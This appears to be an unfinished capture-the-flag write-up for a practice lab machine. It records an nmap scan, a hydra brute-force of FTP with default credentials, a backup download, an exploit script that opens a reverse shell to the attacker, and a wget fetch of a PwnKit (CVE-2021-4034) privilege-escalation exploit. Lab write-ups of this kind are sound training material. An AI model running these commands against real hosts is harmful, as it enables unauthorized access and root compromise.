#InProgress 
```
192.168.195.183
```

## Nmap
```
PORT   STATE  SERVICE  REASON         VERSION
20/tcp closed ftp-data reset ttl 61
21/tcp open   ftp      syn-ack ttl 61 vsftpd 3.0.3
80/tcp open   http     syn-ack ttl 61 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: Host: 127.0.0.1; OS: Unix
```


## Nmap UDP


# Enumeration
## FTP
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s 21 ftp://192.168.195.183
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930094809.png?raw=true)
```
passive
mget backup
```

## HTTP

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930091619.png?raw=true)

strings backup
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930095445.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930100544.png?raw=true)
```
python3 50911.py -s 192.168.45.239 443
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930102513.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930102534.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930102436.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930102630.png?raw=true)

# PrivEsc

## Manual



## Automated

### Peass

```
https://medium.com/@0xrave/exghost-proving-ground-practice-walkthrough-0b50df883a65
```
```
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py -O exploit-kernel.py
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240930104718.png?raw=true)

### Mimikatz

